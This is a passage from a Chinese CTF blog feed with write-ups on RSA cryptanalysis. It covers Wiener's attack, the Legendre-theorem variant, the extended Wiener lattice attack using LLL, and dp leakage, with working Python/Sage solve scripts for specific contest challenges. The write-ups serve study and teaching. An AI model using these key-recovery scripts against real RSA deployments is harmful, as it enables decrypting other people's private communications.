<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line">n =</span><br><span class="line">e =</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wienerAttack</span>(<span class="params">_e, _n</span>):</span></span><br><span class="line">    con_frac = continued_fraction(_e / _n)</span><br><span class="line">    conv = con_frac.convergents()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> conv:</span><br><span class="line">        k, dg = _.numerator(), _.denominator()</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span> <span class="keyword">or</span> dg == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        _phi = _e * dg // k</span><br><span class="line">        <span class="keyword">if</span> (_n - _phi + <span class="number">1</span>) % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> iroot(<span class="built_in">abs</span>(<span class="built_in">pow</span>((_n - _phi + <span class="number">1</span>) // <span class="number">2</span>, <span class="number">2</span>) - _n), <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">            delta = (_phi - _n - <span class="number">1</span>) ** <span class="number">2</span> - <span class="number">4</span> * _n</span><br><span class="line">            _p = (_n + <span class="number">1</span> - _phi - <span class="built_in">int</span>(iroot(delta, <span class="number">2</span>)[<span class="number">0</span>])) // <span class="number">2</span></span><br><span class="line">            _q = _n // _p</span><br><span class="line">            <span class="keyword">assert</span> _n % _q == <span class="number">0</span></span><br><span class="line">            <span class="keyword">return</span> _p, _q</span><br><span class="line"></span><br><span class="line">p, q = wienerAttack(e, n)</span><br></pre></td></tr></table></figure>

<p>当然也可以用欧几里得算法自己实现个连分数（我直接抄la佬博客上的jo本</p>
<h2 id="维纳攻击拓展之勒让德定理"><a href="#维纳攻击拓展之勒让德定理" class="headerlink" title="维纳攻击拓展之勒让德定理"></a>维纳攻击拓展之勒让德定理</h2><p>也确实，维纳攻击真正厉害的地方在勒让德定理，所以远不止可以应用在e特别大上</p>
<h3 id="Task1-2020羊城杯-RRRRRRRSA"><a href="#Task1-2020羊城杯-RRRRRRRSA" class="headerlink" title="Task1 [2020羊城杯] RRRRRRRSA"></a>Task1 [2020羊城杯] RRRRRRRSA</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P1 = getPrime(<span class="number">1038</span>)</span><br><span class="line">P2 = sympy.nextprime(P1)</span><br><span class="line"><span class="keyword">assert</span>(P2 - P1 &lt; <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">Q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">Q2 = sympy.nextprime(Q1)</span><br><span class="line"></span><br><span class="line">N1 = P1 * P1 * Q1</span><br><span class="line">N2 = P2 * P2 * Q2</span><br><span class="line"></span><br><span class="line">E1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">E2 = sympy.nextprime(E1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># N1 = 60143104944034567859993561862949071559877219267755259679749062284763163484947626697494729046430386559610613113754453726683312513915610558734802079868190554644983911078936369464590301246394586190666760362763580192139772729890492729488892169933099057105842090125200369295070365451134781912223048179092058016446222199742919885472867511334714233086339832790286482634562102936600597781342756061479024744312357407750731307860842457299116947352106025529309727703385914891200109853084742321655388368371397596144557614128458065859276522963419738435137978069417053712567764148183279165963454266011754149684758060746773409666706463583389316772088889398359242197165140562147489286818190852679930372669254697353483887004105934649944725189954685412228899457155711301864163839538810653626724347</span></span><br><span class="line"><span class="comment"># N2 = 60143104944034567859993561862949071559877219267755259679749062284763163484947626697494729046430386559610613113754453726683312513915610558734802079868195633647431732875392121458684331843306730889424418620069322578265236351407591029338519809538995249896905137642342435659572917714183543305243715664380787797562011006398730320980994747939791561885622949912698246701769321430325902912003041678774440704056597862093530981040696872522868921139041247362592257285423948870944137019745161211585845927019259709501237550818918272189606436413992759328318871765171844153527424347985462767028135376552302463861324408178183842139330244906606776359050482977256728910278687996106152971028878653123533559760167711270265171441623056873903669918694259043580017081671349232051870716493557434517579121</span></span><br></pre></td></tr></table></figure>

<p>今年湘湖杯签到题就和这一模一样</p>
<p>我们知道$p_2$是$p_1$的下一个素数，$q_2$是$q_1$的下一个素数，指数e这样倒没什么用</p>
<p>其实就是论文里的第三种攻击</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211118172718732.png" alt="image-20211118172718732"></p>
<p>左边素数之间的间距很小，右边p是1038位的，比下面的1028位大10bits，也正对应着$p_2-p_1&lt;1000$</p>
<p>条件成立，如果分解n呢</p>
<p>我们只看第一步，后面是证明勒让德定理成立条件</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211118173445263.png" alt="image-20211118173445263"></p>
<p>计算$\frac{N_1}{N_2}$，并对其进行连分数展开，在其收敛中我们可以找到$q1,q2$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> q1, q2 <span class="keyword">in</span> sub_fraction(N1, N2):</span><br><span class="line">    <span class="keyword">if</span> q1 == <span class="number">0</span> <span class="keyword">or</span> q2 == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> N1 % q1 == <span class="number">0</span> <span class="keyword">and</span> q1 != <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(q1)</span><br></pre></td></tr></table></figure>

<h2 id="拓展维纳攻击"><a href="#拓展维纳攻击" class="headerlink" title="拓展维纳攻击"></a>拓展维纳攻击</h2><h3 id="Wiener’s-Approach"><a href="#Wiener’s-Approach" class="headerlink" title="Wiener’s Approach"></a>Wiener’s Approach</h3><p>$$<br>edg=k(p-1)(q-1)+g<br>$$</p>
<p>令$s=1-p-q$，则<br>$$<br>edg-kN=g+ks\tag{W}<br>$$</p>
<h3 id="Guo’s-Arroach-With-Two-Exponets"><a href="#Guo’s-Arroach-With-Two-Exponets" class="headerlink" title="Guo’s Arroach With Two Exponets"></a>Guo’s Arroach With Two Exponets</h3><p>假设对于一个$N$来说有两个$e_i$，而且都有对应比较小的$d$，那么可以得到<br>$$<br>\begin{cases}<br>e_1d_1-k_1\varphi(N)=1\<br>e_2d_2-k_2\varphi(N)=1<br>\end{cases}<br>$$<br>化简可得（消去$\varphi(N)$<br>$$<br>e_1d_1k_2-e_2d_2k_1=k_2-k_1\tag{G(1,2)}<br>$$<br>所以可推出<br>$$<br>|\frac{e_1}{e_2}-\frac{d_2k_1}{d_1k_2}|=\frac{|k_2-k_1|}{e_2d_1k_1}<br>$$<br>如果$2(k_2-k_1)d_1k_2&lt;e_2$，就可以通过对$\frac{e_1}{e_2}$的连分数找到$\frac{d_2k_1}{d_1k_2}$</p>
<p>然并软，很难通过$\frac{d_2k_1}{d_1k_2}$找$d_1,d_2$</p>
<h3 id="Extending-Wiener’s-Attack"><a href="#Extending-Wiener’s-Attack" class="headerlink" title="Extending Wiener’s Attack"></a>Extending Wiener’s Attack</h3><p>Howgrave-Graham 和 Jean-Pierre Seifert 结合 Wiener 和 Guo的想法，通过多个等式来构造格利用格基规约求解问题</p>
<p>（下面$\alpha$随指数的个数不同而变化，以2个为例</p>
<p>首先假设$d_i&lt;N^\alpha$，联立四个方程（第一个凑数的，没打错<br>$$<br>\begin{cases}<br>k_1k_2=k_2k_2\\<br>W_1k_2\\<br>G_{(1,2)}\\<br>W_1W_2<br>\end{cases}<br>$$<br>即<br>$$<br>\begin{cases}<br>k_1k_2=k_1k_2\\<br>e_1d_1gk_2-k_1Nk_2=gk_2+k_1sk_2\\<br>e_2d_2k_1-e_1d_1k_2=k_1-k_2\\<br>d_1d_2g^2e_1e_2-d_1gk_2e_1N-d_2gk_1e_2N+k_1k_2N^2=(g+k_1s)(g+k_2s)<br>\end{cases}<br>$$<br>从而构造一个都是已知数的矩阵$L$</p>
<p>$A=\begin{bmatrix}<br>k_1k_2 &amp; d_1gk_2 &amp; d_2gk_1 &amp; d1d2g^2<br>\end{bmatrix}$</p>
<p>$L=\begin{bmatrix}<br>1 &amp; -N &amp; 0 &amp; N^2\\<br>0 &amp; e_1 &amp; -e_1 &amp; -e_1N\\<br>0 &amp; 0 &amp; e_2 &amp; -e_2N\\<br>0 &amp; 0 &amp; 0 &amp; e_1e_2<br>\end{bmatrix}$</p>
<p>$B=\begin{bmatrix}<br>k_1k_2 &amp; k_2(g+k_1s) &amp; g(k_1-k_2) &amp; (g+k_1s)(g+k_2s)<br>\end{bmatrix}$<br>$$<br>A\times L=B<br>$$<br>LLL算法用来求维度较低的格的最短向量，如果$B$是$L$的最短向量，就可以把这个$B$给求出来</p>
<p>根据Minkowoski’s first theorem，足有满足：（这个是格的基本定理，等我学完格再来<br>$$<br>\lambda_1(L)\leq \sqrt{N}det(L)^{\frac{1}{n}}<br>$$<br>才是$L$的最短向量，也就是$B$的范式$||B||\leq N$</p>
<p>但这里不成立，于是可以通过调整范数使得条件成立（好长，盗图了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211118200930880.png" alt="image-20211118200930880"></p>
<p>最后求得<br>$$<br>\alpha\leq\frac{5}{14}<br>$$<br>不同的指数个数对应的$\alpha$不同</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211118201533562.png" alt="image-20211118201533562"></p>
<p>而我们要用到的格就如上图所示，更多的格可以在论文里看</p>
<p>这样我们就算出$B$，并通过求逆算出$A$，然后可以发现<br>$$<br>\frac{e_1\times A[1]}{A[0]}=\frac{e_1d_1gk_2}{k_1k_2}=\lfloor\frac{(k_1 \varphi(N)+g)\times k_2}{k_1k_2}\rfloor=\varphi(N)<br>$$<br>皆大欢喜</p>
<h3 id="Task2-2020羊城杯-Simple"><a href="#Task2-2020羊城杯-Simple" class="headerlink" title="Task2 [2020羊城杯] Simple"></a>Task2 [2020羊城杯] Simple</h3><p>一比一地实现论文</p>
<p>第一层就好搞了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>():</span></span><br><span class="line">    p = getPrime(<span class="number">2048</span>)</span><br><span class="line">    q = getPrime(<span class="number">2048</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    bit = n.bit_length()</span><br><span class="line">    phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    num = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        u = getPrime(bit / <span class="number">4</span> - num)</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(u, phi_n) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        t = gmpy2.invert(u, phi_n)</span><br><span class="line">        e = bytes_to_long(des_encrypt(long_to_bytes(t)))</span><br><span class="line">        <span class="built_in">print</span>(e.bit_length())</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(e, phi_n) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> (n, e)</span><br><span class="line"></span><br><span class="line">_n, _e = gen_key()</span><br><span class="line">_c = <span class="built_in">pow</span>(e1, _e, _n)</span><br><span class="line"><span class="comment"># _n = 440489238264900860776949063845200558734341182253911040104689726634414488997095518284964514078079911856352824174173937251558842251349762631716798307360995414545464514355957499460396352456341058329671470384493547042182238690727766731554287411757022792467324815342497916894285866240516524768645049867582541899123632009100512965460004548382054578461249990158442675234477122521189649316341623637146867589119951831385717513964941787562068891523060843170463600255518728070958509224053460041184869943038887434435024428311063533345514827827485121055022245800823723487812635502090530820946638405345755666124356919178290008475459419571761406117827422883820901663916276191422633940699113760516149002609672230610575442643822241126824287790055264162725209120192661985259423924307785452001927701323647247782658775780117642900694831475681037634691806232211286493187121464506122012889644137364079403183353774265910554863733455161820449073656744610495110838881353269890437984975607744603113572453211439334880155671730821755361054781243639407912133971530394031933785051770725331242932929244719594830548310768937037042243794551163891451545574837838357398072638709907958216067999891842395376953596940377457308329336524488962532620850237570279134567668379</span></span><br><span class="line"><span class="comment"># _e = 861605654852236668414010386016782729745549477722901970933220380452652052018502113737968204529790495739233258572209422774257139256367928649554562561889013164344608269555777150446651170697255381344437283003508476336814132594917061838422072660017477530465048729471603537912401826065081663165440462979219418291010867656746870617893935758241591032350010782861988742885918015532494020406350897048575155800941991107973433915573030255070411073793489218782862225921465295055907689734413881263179029741870520797816282420230090879687287575328294171448819803530205292587159921154471289747571107461754730577787617451127061265552788125691266357724955508391085485034126227212788895416902189479587194999818764639403752596165043883295506465916277734482380252399557395621566461322664559344483889187037851178431011220134914560438657522787409632677020269086895142488669203469256629173438313487046130238010206678820035631793666627274457756812810094004185303422637897314225624079032617334487815628021058997628511963565055629435278956251869329025544623291223984190562109149316159243565323565271491356378189561005084676592786453581431393651385181326525455441155960432946682976515756161038293313433862078763004704003356983371787414787104076401121444383911561</span></span><br><span class="line"><span class="comment"># _c = 305937839546594439230463861584604201077374759167468410827830943528403007941779658881672477705113617614828611332427199124217887937391378281943856159571057598203709366891547401974326016980711130197275312149966105151573748299654404630150641461765232935912266448303266990247145252052886920248198006212876273661195636104435277145396636985516064154534488750879453474211852461463041960835745695368577903786702607508492658563272121038693371752289017330781719235752018697635304458321008407930986565779826278048082764754367267460637798512780153281325733348999426407049795270044819657399403071013496169060640127279409914638535996355848933378734045908205536540619564723586905257569498716707820544351092379516465943537383422680357333849248129118148543389733395686399565999586899123087310025442994131218237679518267106194962305629529210402269726736072967966518381350920965727690274018080619332676536005722214955949897632990356174168234408837737546230730400434240785496100281815168806724358191550743656843853383646410487436540166360406982096949178466861150173527305369007546917550634679211293496458282787881244581230558011582720632502886494712233308474151958909251857281750741736910202763888790654287328846201724930302778996046434656839999091303411</span></span><br></pre></td></tr></table></figure>

<p>稍微看一下_n是4095位的，_e是4096位（懒狗不想看代码</p>
<p>_e比_n还大？？？为啥exp里是先解密_t，然后用_t和_n来进行WienerAttack攻击？？？</p>
<p>回顾Wiener’s Attack in RSA，早已不止局限于e特别大了。雀食，_u是_t的逆元，而且<code>u = getPrime(bit / 4 - num)</code>特意满足了$_u^{0.25}&lt;_n$</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211119100105528.png" alt="image-20211119100105528"></p>
<p>这些就够满足Wiener’ Attack的条件了，可以求出$\frac{k}{ug}$，进而分解_n</p>
<p>第二层</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P = getPrime(<span class="number">1024</span>)</span><br><span class="line">Q = getPrime(<span class="number">1024</span>)</span><br><span class="line">N = P * Q</span><br><span class="line">E = <span class="number">65537</span></span><br><span class="line">lcm = gmpy2.lcm(P-<span class="number">1</span>, Q-<span class="number">1</span>)</span><br><span class="line">e1 = gmpy2.invert(getPrime(<span class="number">730</span>), lcm)</span><br><span class="line">e2 = gmpy2.invert(getPrime(<span class="number">730</span>), lcm)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, E, N)</span><br><span class="line"><span class="comment"># N = 14922959775784066499316528935316325825140011208871830627653191549546959775167708525042423039865322548420928571524120743831693550123563493981797950912895893476200447083386549353336086899064921878582074346791320104106139965010480614879592357793053342577850761108944086318475849882440272688246818022209356852924215237481460229377544297224983887026669222885987323082324044645883070916243439521809702674295469253723616677245762242494478587807402688474176102093482019417118703747411862420536240611089529331148684440513934609412884941091651594861530606086982174862461739604705354416587503836130151492937714365614194583664241</span></span><br><span class="line"><span class="comment"># e2 = 27188825731727584656624712988703151030126350536157477591935558508817722580343689565924329442151239649607993377452763119541243174650065563589438911911135278704499670302489754540301886312489410648471922645773506837251600244109619850141762795901696503387880058658061490595034281884089265487336373011424883404499124002441860870291233875045675212355287622948427109362925199018383535259913549859747158348931847041907910313465531703810313472674435425886505383646969400166213185676876969805238803587967334447878968225219769481841748776108219650785975942208190380614555719233460250841332020054797811415069533137170950762289</span></span><br><span class="line"><span class="comment"># c = 6472367338832635906896423990323542537663849304314171581554107495210830026660211696089062916158894195561723047864604633460433867838687338370676287160274165915800235253640690510046066541445140501917731026596427080558567366267665887665459901724487706983166070740324307268574128474775026837827907818762764766069631267853742422247229582756256253175941899099898884656334598790711379305490419932664114615010382094572854799421891622789614614720442708271653376485660139560819668239118588069312179293488684403404385715780406937817124588773689921642802703005341324008483201528345805611493251791950304129082313093168732415486813</span></span><br></pre></td></tr></table></figure>

<p>同样e1和e2也没有直接用于加密，而是用来分解n的</p>
<p>告诉我们的是lcm，即<br>$$<br>\begin{cases}<br>e_1d_1-k_1\frac{\varphi(N)}{g}=1\\<br>e_2d_2-k_2\frac{\varphi(N)}{g}=1<br>\end{cases}<br>$$<br>有关系吗？现在我们的方程组变成</p>
<p>$edg^2-kN=g^2+ks\tag{W}$<br>$$<br>\begin{cases}<br>k_1k_2=k_1k_2\\<br>e_1d_1g^2k_2-k_1Nk_2=g^2k_2+k_1sk_2\\<br>e_2d_2k_1-e_1d_1k_2=k_1-k_2\\<br>d_1d_2g^4e_1e_2-d_1g^2k_2e_1N-d_2g^2k_1e_2N+k_1k_2N^2=(g^2+k_1s)(g^2+k_2s)<br>\end{cases}<br>$$<br>对应三个矩阵</p>
<p>$A=\begin{bmatrix}<br>k_1k_2 &amp; d_1g^2k_2 &amp; d_2g^2k_1 &amp; d1d2g^4<br>\end{bmatrix}$</p>
<p>$L=\begin{bmatrix}<br>1 &amp; -N &amp; 0 &amp; N^2\\<br>0 &amp; e_1 &amp; -e_1 &amp; -e_1N\\<br>0 &amp; 0 &amp; e_2 &amp; -e_2N\\<br>0 &amp; 0 &amp; 0 &amp; e_1e_2<br>\end{bmatrix}$</p>
<p>$B=\begin{bmatrix}<br>k_1k_2 &amp; k_2(g^2+k_1s) &amp; g^2(k_1-k_2) &amp; (g^2+k_1s)(g^2+k_2s)<br>\end{bmatrix}$</p>
<p>我的理解，上面这一通变换$L$是不变的，还是可以求出$B$，求出$A$，然后就当$A[1]$多乘了一个$g$处理，$g=(p-1,q-1)$一般是2，反正不大，也就是最后求得<br>$$<br>\frac{e_1\times A[1]}{A[0]}=\frac{e_1d_1g^2k_2}{k_1k_2}=\lfloor\frac{(k_1 \varphi(N)+g^2)\times k_2}{k_1k_2}\rfloor=\varphi(N)<br>$$<br>其实是一样的，向下取整都没了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">114552459553730357961013268333698879659007919035942930313432809776799669181481660306531243618160127922304264986001501784564575128319884991774542682853466808329973362019677284072646678280051091964555611220961719302320547405880386113519147076299481594997799884384012548506240748042365643212774215730304047871679706035596550898944580314923260982768858133395187777029914150064371998328788068888440803565964567662563652062845388379897799506439389461619422933318625765603423604615137217375612091221578339493263160670355032898186792479034771118678394464854413824347305505135625135428816394053078365603937337271798774138959</span></span><br><span class="line">N = <span class="number">14922959775784066499316528935316325825140011208871830627653191549546959775167708525042423039865322548420928571524120743831693550123563493981797950912895893476200447083386549353336086899064921878582074346791320104106139965010480614879592357793053342577850761108944086318475849882440272688246818022209356852924215237481460229377544297224983887026669222885987323082324044645883070916243439521809702674295469253723616677245762242494478587807402688474176102093482019417118703747411862420536240611089529331148684440513934609412884941091651594861530606086982174862461739604705354416587503836130151492937714365614194583664241</span></span><br><span class="line">e2 = <span class="number">27188825731727584656624712988703151030126350536157477591935558508817722580343689565924329442151239649607993377452763119541243174650065563589438911911135278704499670302489754540301886312489410648471922645773506837251600244109619850141762795901696503387880058658061490595034281884089265487336373011424883404499124002441860870291233875045675212355287622948427109362925199018383535259913549859747158348931847041907910313465531703810313472674435425886505383646969400166213185676876969805238803587967334447878968225219769481841748776108219650785975942208190380614555719233460250841332020054797811415069533137170950762289</span></span><br><span class="line">c = <span class="number">6472367338832635906896423990323542537663849304314171581554107495210830026660211696089062916158894195561723047864604633460433867838687338370676287160274165915800235253640690510046066541445140501917731026596427080558567366267665887665459901724487706983166070740324307268574128474775026837827907818762764766069631267853742422247229582756256253175941899099898884656334598790711379305490419932664114615010382094572854799421891622789614614720442708271653376485660139560819668239118588069312179293488684403404385715780406937817124588773689921642802703005341324008483201528345805611493251791950304129082313093168732415486813</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">5</span> / <span class="number">14</span></span><br><span class="line">M1 = <span class="built_in">int</span>(<span class="built_in">pow</span>(N, <span class="number">0.5</span>))</span><br><span class="line">M2 = <span class="built_in">int</span>(<span class="built_in">pow</span>(N, <span class="number">1</span> + a))</span><br><span class="line">L2 = matrix(ZZ, [[N, -M1 * N, <span class="number">0</span>, N ** <span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>, M1 * e1, -M2 * e1, -e1 * N],</span><br><span class="line">                 [<span class="number">0</span>, <span class="number">0</span>, M2 * e2, -e2 * N],</span><br><span class="line">                 [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, e1 * e2]])</span><br><span class="line">B = L2.LLL()[<span class="number">0</span>]</span><br><span class="line">A = B * L2 ^ (-<span class="number">1</span>)</span><br><span class="line">phi = <span class="built_in">int</span>(e1 * A[<span class="number">1</span>] // A[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(<span class="number">0x10001</span>, phi), N)))</span><br></pre></td></tr></table></figure>

<p>当然$g$的影响可能还体现在$\alpha$上，毕竟矩阵$B$变了（但是没动$\alpha$怎么出来的，等我二刷线代再来</p>
<h3 id="Task3-西湖论剑-WienerStudyTwice"><a href="#Task3-西湖论剑-WienerStudyTwice" class="headerlink" title="Task3 [西湖论剑] WienerStudyTwice"></a>Task3 [西湖论剑] WienerStudyTwice</h3><p>我觉得最为经典的一道题了</p>
<p><a href=""></a></p>
<hr>
<p>最后感觉师傅说的很对</p>
<p>理论知识往往能解决一类问题，而脚本或者工具往往只能解决一个问题</p>
]]></content>
      <tags>
        <tag>拓展维纳攻击</tag>
        <tag>勒让德定理</tag>
        <tag>维纳攻击</tag>
        <tag>连分数</tag>
      </tags>
  </entry>
  <entry>
    <title>dp泄漏攻击</title>
    <url>/posts/6f8a7505/</url>
    <content><![CDATA[<p>20210203</p>
<p>终于看懂了大佬的博客，结合自己的思考过程，写下这篇博客，做好记录，以便再次遇到</p>
<span id="more"></span>

<h1 id="dp泄漏攻击"><a href="#dp泄漏攻击" class="headerlink" title="dp泄漏攻击"></a>dp泄漏攻击</h1><p>之前在buu上有刷到告诉dp和dq的，已经存了脚本</p>
<p>这次在ctfshow上刷到了funnyrsa3只告诉dp，网上有wp也写得清楚易懂，还有脚本，所以重要的是弄清原理<br>首先，</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">13851998696110232034312408768370264747862778787235362033287301947690834384177869107768578977872169953363148442670412868565346964490724532894099772144625540138618913694240688555684873934424471837897053658485573395777349902581306875149677867098014969597240339327588421766510008083189109825385296069501377605893298996953970043168244444585264894721914216744153344106498382558756181912535774309211692338879110643793628550244212618635476290699881188640645260075209594318725693972840846967120418641315829098807385382509029722923894508557890331485536938749583463709142484622852210528766911899504093351926912519458381934550361</span></span><br><span class="line">dp = <span class="number">100611735902103791101540576986246738909129436434351921338402204616138072968334504710528544150282236463859239501881283845616704984276951309172293190252510177093383836388627040387414351112878231476909883325883401542820439430154583554163420769232994455628864269732485342860663552714235811175102557578574454173473</span></span><br><span class="line">c = <span class="number">6181444980714386809771037400474840421684417066099228619603249443862056564342775884427843519992558503521271217237572084931179577274213056759651748072521423406391343404390036640425926587772914253834826777952428924120724879097154106281898045222573790203042535146780386650453819006195025203611969467741808115336980555931965932953399428393416196507391201647015490298928857521725626891994892890499900822051002774649242597456942480104711177604984775375394980504583557491508969320498603227402590571065045541654263605281038512927133012338467311855856106905424708532806690350246294477230699496179884682385040569548652234893413</span></span><br></pre></td></tr></table></figure>

<p>很简单只告诉了四个数字，RSA加密解密的式子就不再赘述<br>这里dp的意思就是<br>$dp＝d\ \%(p-1)$<br>这是唯一的已知条件吧，所以就从这里开始推导<br>目标很明确，要么求p，要么求d，因为求出p一切就都出来了，所以我们试着能不能求出有关p的范围来尝试爆破<br>在这里提醒一点吧，一些做ctf密码学的萌新（比如我），总想着可以直接求出p的值来，但题目往往是让我们求得某个值的范围，然后用脚本爆破</p>
<h2 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h2><p>以上是完整的推导过程，这里讲解下思路</p>
<p>其实就是将$dp＝d\ %(p-1)$ 转化成一般代数的形式$d=k1\times(p-1)+dp$ </p>
<p>由于d和p是要求的未知量，所以我们就想去掉一个</p>
<p>结合已知的求逆元式子$e\times d\equiv1\ mod\ \phi(n)$ 换成的$e\times d=k2\times \phi(n)+1\quad②$</p>
<p>那我们把$①\times e$，得到和②左边一样的，右边等起来就是$k1\times e\times (p-1)+dp\times e=k2\times \phi(n)+1$ 显然这里 $\phi n=(p-1)\times (q-1)$ 就不用说了</p>
<p>将这个式子整理得到$dp\times e=(k2\times (q-1)-k1\times e)(p-1)+1 ③$<br>（因为e和dp是已知的我们就放在一边，另外两项都有公因式（p-1）可以合并）</p>
<p>右边的+1暂且不看，因为无伤大雅</p>
<p>为什么说由题易知，$dp&gt;p-1$ </p>
<p>因为最开始我们就知道$dp\equiv d\ mod(p-1)$ 即$d=dp\ mod(p-1)$ </p>
<p>如果$dp&lt;p-1$(这里我还是没有搞得特别清除，等我弄懂了以后再来吧) </p>
<p>那么d的值就是dp，我们可以去检验一下，发现出来的是乱码，所以显然$dp&gt;p-1$ </p>
<p>所以我们设$X=[k1\times e+k2\times (q-1)],\quad X&lt;e$ </p>
<p>剩下的我们只需要编写脚本，爆破 $[1,e]$ 所有的情况，求出q，符合RSA基本要素之间的关系的就是我们要求的q</p>
<p>之后便是最基本的操作</p>
<h2 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h2><p>最后贴上自己的脚本，可能算不上很精炼，因为菜是一种原罪</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2021/2/3 13:59</span></span><br><span class="line"><span class="comment"># @Author : Will</span></span><br><span class="line"><span class="comment"># @File : funnyrsa3(script).py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">esayrsa</span>(<span class="params">n, p, e, c</span>):</span></span><br><span class="line">    q = n//p</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = invert(e, phi)</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">13851998696110232034312408768370264747862778787235362033287301947690834384177869107768578977872169953363148442670412868565346964490724532894099772144625540138618913694240688555684873934424471837897053658485573395777349902581306875149677867098014969597240339327588421766510008083189109825385296069501377605893298996953970043168244444585264894721914216744153344106498382558756181912535774309211692338879110643793628550244212618635476290699881188640645260075209594318725693972840846967120418641315829098807385382509029722923894508557890331485536938749583463709142484622852210528766911899504093351926912519458381934550361</span></span><br><span class="line">dp = <span class="number">100611735902103791101540576986246738909129436434351921338402204616138072968334504710528544150282236463859239501881283845616704984276951309172293190252510177093383836388627040387414351112878231476909883325883401542820439430154583554163420769232994455628864269732485342860663552714235811175102557578574454173473</span></span><br><span class="line">c = <span class="number">6181444980714386809771037400474840421684417066099228619603249443862056564342775884427843519992558503521271217237572084931179577274213056759651748072521423406391343404390036640425926587772914253834826777952428924120724879097154106281898045222573790203042535146780386650453819006195025203611969467741808115336980555931965932953399428393416196507391201647015490298928857521725626891994892890499900822051002774649242597456942480104711177604984775375394980504583557491508969320498603227402590571065045541654263605281038512927133012338467311855856106905424708532806690350246294477230699496179884682385040569548652234893413</span></span><br><span class="line"><span class="keyword">for</span> X <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">    <span class="comment"># e * dp == (p-1) * X + 1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == (e*dp-<span class="number">1</span>) % X:</span><br><span class="line">        p = (e*dp-<span class="number">1</span>) // X + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == n % p:</span><br><span class="line">            flag = esayrsa(n, p, e, c)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>总结，不太难的推导，对于刚入门的萌新（wo）来说也有一定的收获吧，希望对自己有用，大家有帮助XD</p>
]]></content>
      <tags>
        <tag>dp泄漏攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnSkillTree</title>
    <url>/posts/7769d5fe/</url>
